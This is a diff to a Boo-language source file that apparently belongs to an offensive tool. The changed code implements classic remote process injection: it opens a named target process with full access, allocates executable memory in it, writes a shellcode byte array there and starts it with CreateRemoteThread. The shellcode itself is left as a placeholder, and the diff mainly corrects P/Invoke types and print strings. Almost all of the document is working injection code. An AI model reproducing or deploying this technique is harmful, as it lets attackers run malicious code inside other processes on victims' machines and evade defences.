@@ -2,46 +2,47 @@ import System
 import System.Runtime.InteropServices
 import System.Diagnostics
 
-[DllImport("kernel32.dll")]
-def OpenProcess(dwDesiredAccess as int, bInheritHandle as bool, dwProcessID as int) as int:
+[DllImport("kernel32.dll", SetLastError : true)]
+static def OpenProcess(dwDesiredAccess as int, bInheritHandle as bool, dwProcessID as int) as IntPtr:
     pass
 
-[DllImport("kernel32.dll")]
-def VirtualAllocEx(hProcess as int, lpAddress as int, dwSize as int, flNewProtect as uint, lpflOldProtect as uint) as int:
+[DllImport("kernel32.dll", SetLastError : true, ExactSpelling : true)]
+static def VirtualAllocEx(hProcess as IntPtr, lpAddress as IntPtr, dwSize as int, flAllocationType as uint, flProtect as uint) as IntPtr:
+     pass
+
+[DllImport("kernel32.dll", SetLastError : true)]
+static def WriteProcessMemory(hProcess as IntPtr, lpBaseAddress as IntPtr, lpBuffer as (byte), nSize as int, ref lpNumberOfBytesWritten as IntPtr) as bool:
     pass
 
-[DllImport("kernel32.dll")]
-def WriteProcessMemory(hProcess as int, lpBaseAddress as int, lpBuffer as (byte), nSize as int, lpNumberOfBytesWritten as int) as bool:
-    pass
-
-[DllImport("kernel32.dll")]
-def CreateRemoteThread(hProcess as int, lpThreadAttributes as int, dwStackSize as uint, lpStartAddress as int, lpParameter as int, dwCreationFlags as uint, lpThreadId as int) as int:
-    pass
+[DllImport("kernel32")]
+static def CreateRemoteThread(hProcess as IntPtr, lpThreadAttributes as IntPtr, dwStackSize as int, lpStartAddress as IntPtr, lpParameter as IntPtr, dwCreationFlags as uint, ref lpThreadId as int) as IntPtr:
+     pass
 
 public static def InjectRemote(sc as (byte), process as string):
     # Process Privileges
-    PROCESS_VM_OPERATION = 0x0008 cast int
-    PROCESS_VM_WRITE = 0x0020 cast int
-    PROCESS_VM_READ = 0x0010 cast int
-    PROCESS_ALL = 0x1F0FFF cast int
+    PROCESS_VM_OPERATION = 0x0008
+    PROCESS_VM_WRITE = 0x0020
+    PROCESS_VM_READ = 0x0010
+    PROCESS_ALL = 0x1F0FFF
 
     # Memory Permissions
-    MEM_COMMIT = 0x1000 cast uint
-    PAGE_EXECUTE_READWRITE = 0x40 cast uint
+    MEM_COMMIT = 0x1000
+    PAGE_EXECUTE_READWRITE = 0x40
 
     targetProcess = Process.GetProcessesByName(process)[0]
     procHandle = OpenProcess(PROCESS_ALL, false, targetProcess.Id)
-    print "procHandle = $procHandle\n"
+    print "procHandle = $procHandle"
 
-    resultPtr = VirtualAllocEx(procHandle cast IntPtr, 0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    print "resultPtr = $resultPtr\n"
+    resultPtr = VirtualAllocEx(procHandle, 0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    print "resultPtr = $resultPtr"
 
-    bytesWritten as int = 0;
-    resultBool = WriteProcessMemory(procHandle cast IntPtr, resultPtr cast IntPtr, sc, sc.Length, bytesWritten)
-    print "WriteProcessMemory = $resultBool, bytesWritten = $bytesWritten\n"
+    bytesWritten as IntPtr = 0
+    resultBool = WriteProcessMemory(procHandle, resultPtr, sc, sc.Length, bytesWritten)
+    print "WriteProcessMemory = $resultBool, bytesWritten = $bytesWritten"
 
-    CreateRemoteThread(procHandle cast IntPtr, 0, 0, resultPtr cast IntPtr, 0, 0, 0)
-    print "Injected\n"
+    threadid as int = 0
+    CreateRemoteThread(procHandle, 0, 0, resultPtr, 0, 0, threadid)
+    print "Injected!"
 
 public static def Main():
     shellcode = array(byte, [BYTES])
